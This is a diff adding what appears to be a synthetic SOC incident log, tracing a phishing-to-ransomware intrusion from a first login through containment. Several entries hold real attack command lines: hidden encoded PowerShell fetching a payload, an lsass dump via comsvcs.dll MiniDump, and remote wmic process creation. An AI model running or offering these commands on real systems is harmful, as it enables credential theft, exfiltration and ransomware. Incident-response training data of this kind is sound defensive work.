@@ -1,0 +1,24 @@
+2026-06-24T08:14:07Z email_gateway host=MAIL-GW-01 user=j.patel sender=alerts@ledger-audit-notice.com recipient=j.patel@acme-finance.example subject="Updated Ledger Audit Notice" url=hxxps://invoice-ledger-update.com/login verdict=phishing severity=High mitre=T1566.002
+2026-06-24T08:22:51Z proxy host=FIN-WS-044 user=j.patel src_ip=10.20.44.18 dest_domain=invoice-ledger-update.com dest_ip=91.240.118.172 method=POST uri=/login bytes_out=1840 action=allowed severity=High
+2026-06-24T08:31:33Z vpn_gateway user=j.patel src_ip=45.83.64.21 geo=NL auth_result=success mfa_result=push_approved device=new_device severity=Critical mitre=T1078
+2026-06-24T08:37:12Z identity_provider user=j.patel event=impossible_travel previous_ip=203.0.113.55 current_ip=45.83.64.21 time_delta_minutes=9 severity=High
+2026-06-24T08:44:05Z edr host=FIN-WS-044 user=j.patel process=powershell.exe parent=WINWORD.EXE command="powershell -nop -w hidden -enc JAB3AGMAIAA9ACAA..." network_url=hxxps://cdn-ledger-update.com/payloads/audit_client.exe severity=Critical mitre=T1059.001
+2026-06-24T08:44:16Z edr host=FIN-WS-044 file=C:\Users\j.patel\AppData\Local\Temp\audit_client.exe sha256=a2f4c9d7b5e1234567890abcdef1234567890abcdef1234567890abcdef1234 md5=44d88612fea8a8f36de82e1278abb02f action=created severity=Critical
+2026-06-24T09:02:44Z firewall host=FIN-WS-044 src_ip=10.20.44.18 dest_ip=185.199.110.153 dest_domain=ledger-update-sync.com dest_port=443 protocol=TCP bytes_out=91420 action=allowed severity=High
+2026-06-24T09:18:22Z windows_security host=FIN-WS-044 user=j.patel event_id=4688 process=nltest.exe command="nltest /domain_trusts" parent=cmd.exe severity=Medium mitre=T1018
+2026-06-24T09:19:03Z windows_security host=FIN-WS-044 user=j.patel event_id=4688 process=net.exe command="net group \"Domain Admins\" /domain" parent=cmd.exe severity=High mitre=T1087.002
+2026-06-24T09:26:49Z edr host=FIN-WS-044 user=j.patel process=rundll32.exe command="rundll32.exe comsvcs.dll, MiniDump 732 C:\ProgramData\debug.dmp full" target_process=lsass.exe severity=Critical mitre=T1003.001
+2026-06-24T09:28:11Z edr host=FIN-WS-044 file=C:\ProgramData\debug.dmp action=created size_mb=78 severity=Critical
+2026-06-24T09:36:58Z windows_security host=FIN-WS-044 src_ip=10.20.44.18 dest_host=FILE-SRV-02 event_id=4624 logon_type=3 user=svc_backup auth_package=NTLM severity=High mitre=T1021.002
+2026-06-24T09:42:31Z smb host=FILE-SRV-02 user=svc_backup src_ip=10.20.44.18 share=\\FILE-SRV-02\Finance path=\Q2\Invoices access=read files_accessed=1842 severity=High
+2026-06-24T10:05:26Z edr host=FIN-WS-044 process=7z.exe command="7z a C:\ProgramData\LedgerCache\archive.zip \\FILE-SRV-02\Finance\Q2\Invoices" file=C:\ProgramData\LedgerCache\archive.zip severity=High
+2026-06-24T10:18:14Z firewall host=FIN-WS-044 src_ip=10.20.44.18 dest_ip=185.199.110.153 dest_domain=ledger-update-sync.com dest_port=443 bytes_out=524288000 action=allowed severity=Critical mitre=T1041
+2026-06-24T10:31:40Z edr host=FIN-WS-044 user=svc_backup process=wmic.exe command="wmic /node:FIN-WS-045 process call create powershell.exe" dest_host=FIN-WS-045 severity=High mitre=T1047
+2026-06-24T10:44:02Z windows_security host=FIN-WS-044 user=svc_backup event_id=5145 share=ADMIN$ file=encrypt_stage.ps1 access=WriteData dest_host=FIN-WS-045 severity=Critical mitre=T1486
+2026-06-24T10:47:55Z edr host=FIN-WS-045 process=powershell.exe command="powershell -ExecutionPolicy Bypass -File C:\Windows\Temp\encrypt_stage.ps1" severity=Critical mitre=T1486
+2026-06-24T10:52:18Z vulnerability_scanner asset=VPN-GW-01 cve=CVE-2024-3400 exposure=internet_facing patch_status=missing severity=Critical
+2026-06-24T10:53:36Z vulnerability_scanner asset=MAIL-EXCH-01 cve=CVE-2023-23397 exposure=internet_facing patch_status=missing severity=High
+2026-06-24T11:03:21Z soc_action analyst=a.singh action=blocked_ioc indicators="45.83.64.21,185.199.110.153,91.240.118.172,ledger-update-sync.com,secure-billing-gateway.net" status=completed
+2026-06-24T11:09:12Z soc_action analyst=a.singh action=disabled_account users="j.patel,svc_backup" status=completed
+2026-06-24T11:18:43Z edr host=FIN-WS-044 action=isolated reason="credential dumping and data exfiltration evidence" severity=Critical
+2026-06-24T11:27:30Z incident_summary incident_id=INC-2026-0624-044 category="credential theft and ransomware preparation" affected_assets="FIN-WS-044,FIN-WS-045,FILE-SRV-02,VPN-GW-01,MAIL-EXCH-01" business_impact="finance invoice data exposure and ransomware risk" priority=P1
